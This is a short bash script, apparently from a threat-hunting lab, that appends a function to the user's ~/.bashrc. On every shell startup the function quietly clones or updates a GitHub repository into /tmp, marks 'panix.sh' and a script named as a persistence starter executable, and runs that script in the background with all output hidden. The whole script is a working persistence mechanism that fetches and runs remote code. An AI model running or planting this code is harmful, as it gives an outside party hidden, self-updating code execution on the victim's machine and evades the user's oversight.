#!/bin/bash
 
# Define the unique identifier and the code to append
unique_identifier="update_totally_innocent"
code_to_append='
# Function to clone and update the repository quietly
function update_totally_innocent() {
    local repo_url="https://github.com/Graymos/threathunting-lab.git"  # Replace with your repo URL
    local target_dir="/tmp/totally-innocent"
 
    # Check if the directory exists
    if [ ! -d "$target_dir" ]; then
        git clone "$repo_url" "$target_dir" >/dev/null 2>&1
    else
        cd "$target_dir" >/dev/null 2>&1
        git fetch origin >/dev/null 2>&1
        if git diff --quiet origin/main; then
            return  # No update needed
        else
            git pull origin main >/dev/null 2>&1
        fi
    fi
 
    # Make scripts executable quietly
    chmod +x "$target_dir/panix.sh" "$target_dir/totally-innocent-not-start-of-persistence.sh" >/dev/null 2>&1
 
    # Run the persistence script quietly
    "$target_dir/totally-innocent-not-start-of-persistence.sh" >/dev/null 2>&1 &
}
 
# Call the function to run on shell startup
update_totally_innocent
'
 
# Check if the unique identifier is already in .bashrc
if ! grep -q "$unique_identifier" ~/.bashrc >/dev/null 2>&1; then
    echo -e "$code_to_append" >> ~/.bashrc
else
    echo "Code is already present in .bashrc."
fi
